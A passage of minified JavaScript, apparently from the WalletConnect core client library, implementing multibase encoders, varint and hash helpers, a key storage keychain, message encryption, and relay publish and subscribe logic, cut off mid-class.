d6=ji({name:"base58btc",prefix:"z",alphabet:"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"}),p6=ji({name:"base58flickr",prefix:"Z",alphabet:"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"});var g6=Object.freeze({__proto__:null,base58btc:d6,base58flickr:p6});const y6=Me({prefix:"m",name:"base64",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",bitsPerChar:6}),m6=Me({prefix:"M",name:"base64pad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",bitsPerChar:6}),w6=Me({prefix:"u",name:"base64url",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",bitsPerChar:6}),b6=Me({prefix:"U",name:"base64urlpad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",bitsPerChar:6});var v6=Object.freeze({__proto__:null,base64:y6,base64pad:m6,base64url:w6,base64urlpad:b6});const Lg=Array.from(""),E6=Lg.reduce((t,e,n)=>(t[n]=e,t),[]),x6=Lg.reduce((t,e,n)=>(t[e.codePointAt(0)]=n,t),[]);function _6(t){return t.reduce((e,n)=>(e+=E6[n],e),"")}function I6(t){const e=[];for(const n of t){const r=x6[n.codePointAt(0)];if(r===void 0)throw new Error(`Non-base256emoji character: ${n}`);e.push(r)}return new Uint8Array(e)}const S6=ao({prefix:"",name:"base256emoji",encode:_6,decode:I6});var D6=Object.freeze({__proto__:null,base256emoji:S6}),A6=Fg,Yh=128,O6=-128,$6=Math.pow(2,31);function Fg(t,e,n){e=e||[],n=n||0;for(var r=n;t>=$6;)e[n++]=t&255|Yh,t/=128;for(;t&O6;)e[n++]=t&255|Yh,t>>>=7;return e[n]=t|0,Fg.bytes=n-r+1,e}var C6=rc,P6=128,Zh=127;function rc(t,r){var n=0,r=r||0,i=0,s=r,o,a=t.length;do{if(s>=a)throw rc.bytes=0,new RangeError("Could not decode varint");o=t[s++],n+=i<28?(o&Zh)<<i:(o&Zh)*Math.pow(2,i),i+=7}while(o>=P6);return rc.bytes=s-r,n}var T6=Math.pow(2,7),B6=Math.pow(2,14),R6=Math.pow(2,21),k6=Math.pow(2,28),N6=Math.pow(2,35),U6=Math.pow(2,42),M6=Math.pow(2,49),L6=Math.pow(2,56),F6=Math.pow(2,63),j6=function(t){return t<T6?1:t<B6?2:t<R6?3:t<k6?4:t<N6?5:t<U6?6:t<M6?7:t<L6?8:t<F6?9:10},q6={encode:A6,decode:C6,encodingLength:j6},jg=q6;const Xh=(t,e,n=0)=>(jg.encode(t,e,n),e),Jh=t=>jg.encodingLength(t),ic=(t,e)=>{const n=e.byteLength,r=Jh(t),i=r+Jh(n),s=new Uint8Array(i+n);return Xh(t,s,0),Xh(n,s,r),s.set(e,i),new z6(t,n,e,s)};class z6{constructor(e,n,r,i){this.code=e,this.size=n,this.digest=r,this.bytes=i}}const qg=({name:t,code:e,encode:n})=>new V6(t,e,n);class V6{constructor(e,n,r){this.name=e,this.code=n,this.encode=r}digest(e){if(e instanceof Uint8Array){const n=this.encode(e);return n instanceof Uint8Array?ic(this.code,n):n.then(r=>ic(this.code,r))}else throw Error("Unknown type, must be binary type")}}const zg=t=>async e=>new Uint8Array(await crypto.subtle.digest(t,e)),W6=qg({name:"sha2-256",code:18,encode:zg("SHA-256")}),K6=qg({name:"sha2-512",code:19,encode:zg("SHA-512")});var H6=Object.freeze({__proto__:null,sha256:W6,sha512:K6});const Vg=0,G6="identity",Wg=Ug,Y6=t=>ic(Vg,Wg(t)),Z6={code:Vg,name:G6,encode:Wg,digest:Y6};var X6=Object.freeze({__proto__:null,identity:Z6});new TextEncoder,new TextDecoder;const Qh={...VD,...KD,...GD,...ZD,...QD,...l6,...f6,...g6,...v6,...D6};({...H6,...X6});function Kg(t){return globalThis.Buffer!=null?new Uint8Array(t.buffer,t.byteOffset,t.byteLength):t}function J6(t=0){return globalThis.Buffer!=null&&globalThis.Buffer.allocUnsafe!=null?Kg(globalThis.Buffer.allocUnsafe(t)):new Uint8Array(t)}function Hg(t,e,n,r){return{name:t,prefix:e,encoder:{name:t,prefix:e,encode:n},decoder:{decode:r}}}const ef=Hg("utf8","u",t=>"u"+new TextDecoder("utf8").decode(t),t=>new TextEncoder().encode(t.substring(1))),ca=Hg("ascii","a",t=>{let e="a";for(let n=0;n<t.length;n++)e+=String.fromCharCode(t[n]);return e},t=>{t=t.substring(1);const e=J6(t.length);for(let n=0;n<t.length;n++)e[n]=t.charCodeAt(n);return e}),Q6={utf8:ef,"utf-8":ef,hex:Qh.base16,latin1:ca,ascii:ca,binary:ca,...Qh};function eA(t,e="utf8"){const n=Q6[e];if(!n)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?Kg(globalThis.Buffer.from(t,"utf-8")):n.decoder.decode(`${n.prefix}${t}`)}var tA=Object.defineProperty,nA=(t,e,n)=>e in t?tA(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Nt=(t,e,n)=>nA(t,typeof e!="symbol"?e+"":e,n);class rA{constructor(e,n){this.core=e,this.logger=n,Nt(this,"keychain",new Map),Nt(this,"name",nD),Nt(this,"version",rD),Nt(this,"initialized",!1),Nt(this,"storagePrefix",Vt),Nt(this,"init",async()=>{if(!this.initialized){const r=await this.getKeyChain();typeof r<"u"&&(this.keychain=r),this.initialized=!0}}),Nt(this,"has",r=>(this.isInitialized(),this.keychain.has(r))),Nt(this,"set",async(r,i)=>{this.isInitialized(),this.keychain.set(r,i),await this.persist()}),Nt(this,"get",r=>{this.isInitialized();const i=this.keychain.get(r);if(typeof i>"u"){const{message:s}=V("NO_MATCHING_KEY",`${this.name}: ${r}`);throw new Error(s)}return i}),Nt(this,"del",async r=>{this.isInitialized(),this.keychain.delete(r),await this.persist()}),this.core=e,this.logger=dt(n,this.name)}get context(){return ot(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}async setKeyChain(e){await this.core.storage.setItem(this.storageKey,Ma(e))}async getKeyChain(){const e=await this.core.storage.getItem(this.storageKey);return typeof e<"u"?La(e):void 0}async persist(){await this.setKeyChain(this.keychain)}isInitialized(){if(!this.initialized){const{message:e}=V("NOT_INITIALIZED",this.name);throw new Error(e)}}}var iA=Object.defineProperty,sA=(t,e,n)=>e in t?iA(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,_e=(t,e,n)=>sA(t,typeof e!="symbol"?e+"":e,n);class oA{constructor(e,n,r){this.core=e,this.logger=n,_e(this,"name",eD),_e(this,"keychain"),_e(this,"randomSessionIdentifier",Za()),_e(this,"initialized",!1),_e(this,"clientId"),_e(this,"init",async()=>{this.initialized||(await this.keychain.init(),this.initialized=!0)}),_e(this,"hasKeys",i=>(this.isInitialized(),this.keychain.has(i))),_e(this,"getClientId",async()=>{if(this.isInitialized(),this.clientId)return this.clientId;const i=await this.getClientSeed(),s=hu(i),o=Id(s.publicKey);return this.clientId=o,o}),_e(this,"generateKeyPair",()=>{this.isInitialized();const i=FI();return this.setPrivateKey(i.publicKey,i.privateKey)}),_e(this,"signJWT",async i=>{this.isInitialized();const s=await this.getClientSeed(),o=hu(s),a=this.randomSessionIdentifier;return await D1(a,i,tD,o)}),_e(this,"generateSharedKey",(i,s,o)=>{this.isInitialized();const a=this.getPrivateKey(i),c=jI(a,s);return this.setSymKey(c,o)}),_e(this,"setSymKey",async(i,s)=>{this.isInitialized();const o=s||ps(i);return await this.keychain.set(o,i),o}),_e(this,"deleteKeyPair",async i=>{this.isInitialized(),await this.keychain.del(i)}),_e(this,"deleteSymKey",async i=>{this.isInitialized(),await this.keychain.del(i)}),_e(this,"encode",async(i,s,o)=>{this.isInitialized();const a=xg(o),c=rr(s);if(Dh(a))return VI(c,o?.encoding);if(Sh(a)){const f=a.senderPublicKey,p=a.receiverPublicKey;i=await this.generateSharedKey(f,p)}const l=this.getSymKey(i),{type:u,senderPublicKey:h}=a;return qI({type:u,symKey:l,message:c,senderPublicKey:h,encoding:o?.encoding})}),_e(this,"decode",async(i,s,o)=>{this.isInitialized();const a=KI(s,o);if(Dh(a)){const c=WI(s,o?.encoding);return Br(c)}if(Sh(a)){const c=a.receiverPublicKey,l=a.senderPublicKey;i=await this.generateSharedKey(c,l)}try{const c=this.getSymKey(i),l=zI({symKey:c,encoded:s,encoding:o?.encoding});return Br(l)}catch(c){this.logger.error(`Failed to decode message from topic: '${i}', clientId: '${await this.getClientId()}'`),this.logger.error(c)}}),_e(this,"getPayloadType",(i,s=nt)=>{const o=Ai({encoded:i,encoding:s});return or(o.type)}),_e(this,"getPayloadSenderPublicKey",(i,s=nt)=>{const o=Ai({encoded:i,encoding:s});return o.senderPublicKey?st(o.senderPublicKey,Ye):void 0}),this.core=e,this.logger=dt(n,this.name),this.keychain=r||new rA(this.core,this.logger)}get context(){return ot(this.logger)}async setPrivateKey(e,n){return await this.keychain.set(e,n),e}getPrivateKey(e){return this.keychain.get(e)}async getClientSeed(){let e="";try{e=this.keychain.get(Hh)}catch{e=Za(),await this.keychain.set(Hh,e)}return eA(e,"base16")}getSymKey(e){return this.keychain.get(e)}isInitialized(){if(!this.initialized){const{message:e}=V("NOT_INITIALIZED",this.name);throw new Error(e)}}}var aA=Object.defineProperty,cA=Object.defineProperties,lA=Object.getOwnPropertyDescriptors,tf=Object.getOwnPropertySymbols,uA=Object.prototype.hasOwnProperty,hA=Object.prototype.propertyIsEnumerable,sc=(t,e,n)=>e in t?aA(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,fA=(t,e)=>{for(var n in e||(e={}))uA.call(e,n)&&sc(t,n,e[n]);if(tf)for(var n of tf(e))hA.call(e,n)&&sc(t,n,e[n]);return t},dA=(t,e)=>cA(t,lA(e)),ct=(t,e,n)=>sc(t,typeof e!="symbol"?e+"":e,n);class pA extends Im{constructor(e,n){super(e,n),this.logger=e,this.core=n,ct(this,"messages",new Map),ct(this,"messagesWithoutClientAck",new Map),ct(this,"name",iD),ct(this,"version",sD),ct(this,"initialized",!1),ct(this,"storagePrefix",Vt),ct(this,"init",async()=>{if(!this.initialized){this.logger.trace("Initialized");try{const r=await this.getRelayerMessages();typeof r<"u"&&(this.messages=r);const i=await this.getRelayerMessagesWithoutClientAck();typeof i<"u"&&(this.messagesWithoutClientAck=i),this.logger.debug(`Successfully Restored records for ${this.name}`),this.logger.trace({type:"method",method:"restore",size:this.messages.size})}catch(r){this.logger.debug(`Failed to Restore records for ${this.name}`),this.logger.error(r)}finally{this.initialized=!0}}}),ct(this,"set",async(r,i,s)=>{this.isInitialized();const o=bt(i);let a=this.messages.get(r);if(typeof a>"u"&&(a={}),typeof a[o]<"u")return o;if(a[o]=i,this.messages.set(r,a),s===gs.inbound){const c=this.messagesWithoutClientAck.get(r)||{};this.messagesWithoutClientAck.set(r,dA(fA({},c),{[o]:i}))}return await this.persist(),o}),ct(this,"get",r=>{this.isInitialized();let i=this.messages.get(r);return typeof i>"u"&&(i={}),i}),ct(this,"getWithoutAck",r=>{this.isInitialized();const i={};for(const s of r){const o=this.messagesWithoutClientAck.get(s)||{};i[s]=Object.values(o)}return i}),ct(this,"has",(r,i)=>{this.isInitialized();const s=this.get(r),o=bt(i);return typeof s[o]<"u"}),ct(this,"ack",async(r,i)=>{this.isInitialized();const s=this.messagesWithoutClientAck.get(r);if(typeof s>"u")return;const o=bt(i);delete s[o],Object.keys(s).length===0?this.messagesWithoutClientAck.delete(r):this.messagesWithoutClientAck.set(r,s),await this.persist()}),ct(this,"del",async r=>{this.isInitialized(),this.messages.delete(r),this.messagesWithoutClientAck.delete(r),await this.persist()}),this.logger=dt(e,this.name),this.core=n}get context(){return ot(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get storageKeyWithoutClientAck(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name+"_withoutClientAck"}async setRelayerMessages(e){await this.core.storage.setItem(this.storageKey,Ma(e))}async setRelayerMessagesWithoutClientAck(e){await this.core.storage.setItem(this.storageKeyWithoutClientAck,Ma(e))}async getRelayerMessages(){const e=await this.core.storage.getItem(this.storageKey);return typeof e<"u"?La(e):void 0}async getRelayerMessagesWithoutClientAck(){const e=await this.core.storage.getItem(this.storageKeyWithoutClientAck);return typeof e<"u"?La(e):void 0}async persist(){await this.setRelayerMessages(this.messages),await this.setRelayerMessagesWithoutClientAck(this.messagesWithoutClientAck)}isInitialized(){if(!this.initialized){const{message:e}=V("NOT_INITIALIZED",this.name);throw new Error(e)}}}var gA=Object.defineProperty,yA=Object.defineProperties,mA=Object.getOwnPropertyDescriptors,nf=Object.getOwnPropertySymbols,wA=Object.prototype.hasOwnProperty,bA=Object.prototype.propertyIsEnumerable,oc=(t,e,n)=>e in t?gA(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Er=(t,e)=>{for(var n in e||(e={}))wA.call(e,n)&&oc(t,n,e[n]);if(nf)for(var n of nf(e))bA.call(e,n)&&oc(t,n,e[n]);return t},rf=(t,e)=>yA(t,mA(e)),yt=(t,e,n)=>oc(t,typeof e!="symbol"?e+"":e,n);class vA extends Sm{constructor(e,n){super(e,n),this.relayer=e,this.logger=n,yt(this,"events",new Tt.EventEmitter),yt(this,"name",aD),yt(this,"queue",new Map),yt(this,"publishTimeout",z.toMiliseconds(z.ONE_MINUTE)),yt(this,"initialPublishTimeout",z.toMiliseconds(z.ONE_SECOND*15)),yt(this,"needsTransportRestart",!1),yt(this,"publish",async(r,i,s)=>{var o,a,c,l,u;this.logger.debug("Publishing Payload"),this.logger.trace({type:"method",method:"publish",params:{topic:r,message:i,opts:s}});const h=s?.ttl||oD,f=s?.prompt||!1,p=s?.tag||0,d=s?.id||On().toString(),g=$r(Us().protocol),w={id:d,method:s?.publishMethod||g.publish,params:Er({topic:r,message:i,ttl:h,prompt:f,tag:p,attestation:s?.attestation},s?.tvf)},_=`Failed to publish payload, please try again. id:${d} tag:${p}`;try{$e((o=w.params)==null?void 0:o.prompt)&&((a=w.params)==null||delete a.prompt),$e((c=w.params)==null?void 0:c.tag)&&((l=w.params)==null||delete l.tag);const C=new Promise(async v=>{const b=({id:O})=>{var B;((B=w.id)==null?void 0:B.toString())===O.toString()&&(this.removeRequestFromQueue(O),this.relayer.events.removeListener(we.publish,b),v())};this.relayer.events.on(we.publish,b);const x=zt(new Promise((O,B)=>{this.rpcPublish(w,s).then(O).catch(k=>{this.logger.warn(k,k?.message),B(k)})}),this.initialPublishTimeout,`Failed initial publish, retrying.... id:${d} tag:${p}`);try{await x,this.events.removeListener(we.publish,b)}catch(O){this.queue.set(d,{request:w,opts:s,attempt:1}),this.logger.warn(O,O?.message)}});this.logger.trace({type:"method",method:"publish",params:{id:d,topic:r,message:i,opts:s}}),await zt(C,this.publishTimeout,_)}catch(C){if(this.logger.debug("Failed to Publish Payload"),this.logger.error(C),(u=s?.internal)!=null&&u.throwOnFailedPublish)throw C}finally{this.queue.delete(d)}}),yt(this,"publishCustom",async r=>{var i,s,o,a,c;this.logger.debug("Publishing custom payload"),this.logger.trace({type:"method",method:"publishCustom",params:r});const{payload:l,opts:u={}}=r,{attestation:h,tvf:f,publishMethod:p,prompt:d,tag:g,ttl:w=z.FIVE_MINUTES}=u,_=u.id||On().toString(),C=$r(Us().protocol),v=p||C.publish,b={id:_,method:v,params:Er(rf(Er({},l),{ttl:w,prompt:d,tag:g,attestation:h}),f)},x=`Failed to publish custom payload, please try again. id:${_} tag:${g}`;try{$e((i=b.params)==null?void 0:i.prompt)&&((s=b.params)==null||delete s.prompt),$e((o=b.params)==null?void 0:o.tag)&&((a=b.params)==null||delete a.tag);const O=new Promise(async B=>{const k=({id:N})=>{var E;((E=b.id)==null?void 0:E.toString())===N.toString()&&(this.removeRequestFromQueue(N),this.relayer.events.removeListener(we.publish,k),B())};this.relayer.events.on(we.publish,k);const $=zt(new Promise((N,E)=>{this.rpcPublish(b,u).then(N).catch(S=>{this.logger.warn(S,S?.message),E(S)})}),this.initialPublishTimeout,`Failed initial custom payload publish, retrying.... method:${v} id:${_} tag:${g}`);try{await $,this.events.removeListener(we.publish,k)}catch(N){this.queue.set(_,{request:b,opts:u,attempt:1}),this.logger.warn(N,N?.message)}});this.logger.trace({type:"method",method:"publish",params:{id:_,payload:l,opts:u}}),await zt(O,this.publishTimeout,x)}catch(O){if(this.logger.debug("Failed to Publish Payload"),this.logger.error(O),(c=u?.internal)!=null&&c.throwOnFailedPublish)throw O}finally{this.queue.delete(_)}}),yt(this,"on",(r,i)=>{this.events.on(r,i)}),yt(this,"once",(r,i)=>{this.events.once(r,i)}),yt(this,"off",(r,i)=>{this.events.off(r,i)}),yt(this,"removeListener",(r,i)=>{this.events.removeListener(r,i)}),this.relayer=e,this.logger=dt(n,this.name),this.registerEventListeners()}get context(){return ot(this.logger)}async rpcPublish(e,n){this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"message",direction:"outgoing",request:e});const r=await this.relayer.request(e);return this.relayer.events.emit(we.publish,Er(Er({},e),n)),this.logger.debug("Successfully Published Payload"),r}removeRequestFromQueue(e){this.queue.delete(e)}checkQueue(){this.queue.forEach(async(e,n)=>{var r;const i=e.attempt+1;this.queue.set(n,rf(Er({},e),{attempt:i})),this.logger.warn({},`Publisher: queue->publishing: ${e.request.id}, tag: ${(r=e.request.params)==null?void 0:r.tag}, attempt: ${i}`),await this.rpcPublish(e.request,e.opts),this.logger.warn({},`Publisher: queue->published: ${e.request.id}`)})}registerEventListeners(){this.relayer.core.heartbeat.on(cr.pulse,()=>{if(this.needsTransportRestart){this.needsTransportRestart=!1,this.relayer.events.emit(we.connection_stalled);return}this.checkQueue()}),this.relayer.on(we.message_ack,e=>{this.removeRequestFromQueue(e.id.toString())})}}var EA=Object.defineProperty,xA=(t,e,n)=>e in t?EA(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,xr=(t,e,n)=>xA(t,typeof e!="symbol"?e+"":e,n);class _A{constructor(){xr(this,"map",new Map),xr(this,"set",(e,n)=>{const r=this.get(e);this.exists(e,n)||this.map.set(e,[...r,n])}),xr(this,"get",e=>this.map.get(e)||[]),xr(this,"exists",(e,n)=>this.get(e).includes(n)),xr(this,"delete",(e,n)=>{if(typeof n>"u"){this.map.delete(e);return}if(!this.map.has(e))return;const r=this.get(e);if(!this.exists(e,n))return;const i=r.filter(s=>s!==n);if(!i.length){this.map.delete(e);return}this.map.set(e,i)}),xr(this,"clear",()=>{this.map.clear()})}get topics(){return Array.from(this.map.keys())}}var IA=Object.defineProperty,SA=Object.defineProperties,DA=Object.getOwnPropertyDescriptors,sf=Object.getOwnPropertySymbols,AA=Object.prototype.hasOwnProperty,OA=Object.prototype.propertyIsEnumerable,ac=(t,e,n)=>e in t?IA(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,ii=(t,e)=>{for(var n in e||(e={}))AA.call(e,n)&&ac(t,n,e[n]);if(sf)for(var n of sf(e))OA.call(e,n)&&ac(t,n,e[n]);return t},la=(t,e)=>SA(t,DA(e)),ce=(t,e,n)=>ac(t,typeof e!="symbol"?e+"":e,n);class $A extends Om{constructor(e,n){super(e,n),this.relayer=e,this.logger=n,ce(this,"subscriptions",new Map),ce(this,"topicMap",new _A),ce(this,"events",new Tt.EventEmitter),ce(this,"name",pD),ce(this,"version",gD),ce(this,"pending",new Map),ce(this,"cached",[]),ce(this,"initialized",!1),ce(this,"storagePrefix",Vt),ce(this,"subscribeTimeout",z.toMiliseconds(z.ONE_MINUTE)),ce(this,"initialSubscribeTimeout",z.toMiliseconds(z.ONE_SECOND*15)),ce(this,"clientId"),ce(this,"batchSubscribeTopicsLimit",500),ce(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),this.registerEventListeners(),await this.restore()),this.initialized=!0}),ce(this,"subscribe",async(r,i)=>{var s;this.isInitialized(),this.logger.debug("Subscribing Topic"),this.logger.trace({type:"method",method:"subscribe",params:{topic:r,opts:i}});try{const o=Us(i),a={topic:r,relay:o,transportType:i?.transportType};(s=i?.internal)!=null&&s.skipSubscribe||this.pending.set(r,a);const c=await this.rpcSubscribe(r,o,i);return typeof c=="string"&&(this.onSubscribe(c,a),this.logger.debug("Successfully Subscribed Topic"),this.logger.trace({type:"method",method:"subscribe",params:{topic:r,opts:i}})),c}catch(o){throw this.logger.debug("Failed to Subscribe Topic"),this.logger.error(o),o}}),ce(this,"unsubscribe",async(r,i)=>{this.isInitialized(),typeof i?.id<"u"?await this.unsubscribeById(r,i.id,i):await this.unsubscribeByTopic(r,i)}),ce(this,"isSubscribed",r=>new Promise(i=>{i(this.topicMap.topics.includes(r))})),ce(this,"isKnownTopic",r=>new Promise(i=>{i(this.topicMap.topics.includes(r)||this.pending.has(r)||this.cached.some(s=>s.topic===r))})),ce(this,"on",(r,i)=>{this.events.on(r,i)}),ce(this,"once",(r,i)=>{this.events.once(r,i)}),ce(this,"off",(r,i)=>{this.events.off(r,i)}),ce(this,"removeListener",(r,i)=>{this.events.removeListener(r,i)}),ce(this,"start",async()=>{await this.onConnect()}),ce(this,"stop",async()=>{await this.onDisconnect()}),ce(this,"restart",async()=>{await this.restore(),await this.onRestart()}),ce(this,"checkPending",async()=>{if(this.pending.size===0&&(!this.initialized||!this.relayer.connected))return;const r=[];this.pending.forEach(i=>{r.push(i)}),await this.batchSubscribe(r)}),ce(this,"registerEventListeners",()=>{this.relayer.core.heartbeat.on(cr.pulse,async()=>{await this.checkPending()}),this.events.on(lt.created,async r=>{const i=lt.created;this.logger.info(`Emitting ${i}`),this.logger.debug({type:"event",event:i,data:r}),await this.persist()}),this.events.on(lt.deleted,async r=>{const i=lt.deleted;this.logger.info(`Emitting ${i}`),this.logger.debug({type:"event",event:i,data:r}),await this.persist()})}),this.relayer=e,this.logger=dt(n,this.name),this.clientId=""}get context(){return ot(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.relayer.core.customStoragePrefix+"//"+this.name}get length(){return this.subscriptions.size}get ids(){return Array.from(this.subscriptions.keys())}get values(){return Array.from(this.subscriptions.values())}get topics(){return this.topicMap.topics}get hasAnyTopics(){return this.topicMap.topics.length>0||this.pending.size>0||this.cached.length>0||this.subscriptions.size>0}hasSubscription(e,n){let r=!1;try{r=this.getSubscription(e).topic===n}catch{}return r}reset(){this.cached=[],this.initialized=!0}onDisable(){this.values.length>0&&(this.cached=this.values),this.subscriptions.clear(),this.topicMap.clear()}async unsubscribeByTopic(e,n){const r=this.topicMap.get(e);await Promise.all(r.map(async i=>await this.unsubscribeById(e,i,n)))}async unsubscribeById(e,n,r){this.logger.debug("Unsubscribing Topic"),this.logger.trace({type:"method",method:"unsubscribe",params:{topic:e,id:n,opts:r}});try{const i=Us(r);await this.restartToComplete({topic:e,id:n,relay:i}),await this.rpcUnsubscribe(e,n,i);const s=de("USER_DISCONNECTED",`${this.name}, ${e}`);await this.onUnsubscribe(e,n,s),this.logger.debug("Successfully Unsubscribed Topic"),this.logger.trace({type:"method",method:"unsubscribe",params:{topic:e,id:n,opts:r}})}catch(i){throw this.logger.debug("Failed to Unsubscribe Topic"),this.logger.error(i),i}}async rpcSubscribe(e,n,r){var i,s;const o=await this.getSubscriptionId(e);if((i=r?.internal)!=null&&i.skipSubscribe)return o;(!r||r?.transportType===he.relay)&&await this.restartToComplete({topic:e,id:e,relay:n});const a={method:$r(n.protocol).subscribe,params:{topic:e}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:a});const c=(s=r?.internal)==null?void 0:s.throwOnFailedPublish;try{if(r?.transportType===he.link_mode)return setTimeout(()=>{(this.relayer.connected||this.relayer.connecting)&&this.relayer.request(a).catch(h=>this.logger.warn(h))},z.toMiliseconds(z.ONE_SECOND)),o;const l=new Promise(async h=>{const f=p=>{p.topic===e&&(this.events.removeListener(lt.created,f),h(p.id))};this.events.on(lt.created,f);try{const p=await zt(new Promise((d,g)=>{this.relayer.request(a).catch(w=>{this.logger.warn(w,w?.message),g(w)}).then(d)}),this.initialSubscribeTimeout,`Subscribing to ${e} failed, please try again`);this.events.removeListener(lt.created,f),h(p)}catch{}}),u=await zt(l,this.subscribeTimeout,`Subscribing to ${e} failed, please try again`);if(!u&&c)throw new Error(`Subscribing to ${e} failed, please try again`);return u?o:null}catch(l){if(this.logger.debug("Outgoing Relay Subscribe Payload stalled"),this.relayer.events.emit(we.connection_stalled),c)throw l}return null}async rpcBatchSubscribe(e){if(!e.length)return;const n=e[0].relay,r={method:$r(n.protocol).batchSubscribe,params:{topics:e.map(i=>i.topic)}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:r});try{await await zt(new Promise(i=>{this.relayer.request(r).catch(s=>this.logger.warn(s)).then(i)}),this.subscribeTimeout,"rpcBatchSubscribe failed, please try again")}catch{this.relayer.events.emit(we.connection_stalled)}}async rpcBatchFetchMessages(e){if(!e.length)return;const n=e[0].relay,r={method:$r(n.protocol).batchFetchMessages,params:{topics:e.map(s=>s.topic)}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:r});let i;try{i=await await zt(new Promise((s,o)=>{this.relayer.request(r).catch(a=>{this.logger.warn(a),o(a)}).then(s)}),this.subscribeTimeout,"rpcBatchFetchMessages failed, please try again")}catch{this.relayer.events.emit(we.connection_stalled)}return i}rpcUnsubscribe(e,n,r){const i={method:$r(r.protocol).unsubscribe,params:{topic:e,id:n}};return this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:i}),this.relayer.request(i)}onSubscribe(e,n){this.setSubscription(e,la(ii({},n),{id:e})),this.pending.delete(n.topic)}onBatchSubscribe(e){e.length&&e.forEach(n=>{this.setSubscription(n.id,ii({},n)),this.pending.delete(n.topic)})}async onUnsubscribe(e,n,r){this.events.removeAllListeners(n),this.hasSubscription(n,e)&&this.deleteSubscription(n,r),await this.relayer.messages.del(e)}async setRelayerSubscriptions(e){await this.relayer.core.storage.setItem(this.storageKey,e)}async getRelayerSubscriptions(){return await this.relayer.core.storage.getItem(this.storageKey)}setSubscription(e,n){this.logger.debug("Setting subscription"),this.logger.trace({type:"method",method:"setSubscription",id:e,subscription:n}),this.addSubscription(e,n)}addSubscription(e,n){this.subscriptions.set(e,ii({},n)),this.topicMap.set(n.topic,e),this.events.emit(lt.created,n)}getSubscription(e){this.logger.debug("Getting subscription"),this.logger.trace({type:"method",method:"getSubscription",id:e});const n=this.subscriptions.get(e);if(!n){const{message:r}=V("NO_MATCHING_KEY",`${this.name}: ${e}`);throw new Error(r)}return n}deleteSubscription(e,n){this.logger.debug("Deleting subscription"),this.logger.trace({type:"method",method:"deleteSubscription",id:e,reason:n});const r=this.getSubscription(e);this.subscriptions.delete(e),this.topicMap.delete(r.topic,e),this.events.emit(lt.deleted,la(ii({},r),{reason:n}))}async persist(){await this.setRelayerSubscriptions(this.values),this.events.emit(lt.sync)}async onRestart(){if(this.cached.length){const e=[...this.cached],n=Math.ceil(this.cached.length/this.batchSubscribeTopicsLimit);for(let r=0;r<n;r++){const i=e.splice(0,this.batchSubscribeTopicsLimit);await this.batchSubscribe(i)}}this.events.emit(lt.resubscribed)}async restore(){try{const e=await this.getRelayerSubscriptions();if(typeof e>"u"||!e.length)return;if(this.subscriptions.size&&!e.every(n=>{var r;return n.topic===((r=this.subscriptions.get(n.id))==null?void 0:r.topic)})){const{message:n}=V("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(n),this.logger.error(`${this.name}: ${JSON.stringify(this.values)}`),new Error(n)}this.cached=e,this.logger.debug(`Successfully Restored subscriptions for ${this.name}`),this.logger.trace({type:"method",method:"restore",subscriptions:this.values})}catch(e){this.logger.debug(`Failed to Restore subscriptions for ${this.name}`),this.logger.error(e)}}async batchSubscribe(e){e.length&&(await this.rpcBatchSubscribe(e),this.onBatchSubscribe(await Promise.all(e.map(async n=>la(ii({},n),{id:await this.getSubscriptionId(n.topic)})))))}async batchFetchMessages(e){if(!e.length)return;this.logger.trace(`Fetching batch messages for ${e.length} subscriptions`);const n=await this.rpcBatchFetchMessages(e);n&&n.messages&&(await o3(z.toMiliseconds(z.ONE_SECOND)),await this.relayer.handleBatchMessageEvents(n.messages))}async onConnect(){await this.restart(),this.reset()}onDisconnect(){this.onDisable()}isInitialized(){if(!this.initialized){const{message:e}=V("NOT_INITIALIZED",this.name);throw new Error(e)}}async restartToComplete(e){!this.relayer.connected&&!this.relayer.connecting&&(this.cached.push(e),await this.relayer.transportOpen())}async getClientId(){return this.clientId||(this.clientId=await this.relayer.core.crypto.getClientId()),this.clientId}async getSubscriptionId(e){return bt(e+await this.getClientId())}}var CA=Object.defineProperty,of=Object.getOwnPropertySymbols,PA=Object.prototype.hasOwnProperty,TA=Object.prototype.propertyIsEnumerable,cc=(t,e,n)=>e in t?CA(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,af=(t,e)=>{for(var n in e||(e={}))PA.call(e,n)&&cc(t,n,e[n]);if(of)for(var n of of(e))TA.call(e,n)&&cc(t,n,e[n]);return t},re=(t,e,n)=>cc(t,typeof e!="symbol"?e+"":e,n);class BA extends Dm{constructor(e){var n;super(e),re(this,"protocol","wc"),re(this,"version",2),re(this,"core"),re(this,"logger"),re(this,"events",new 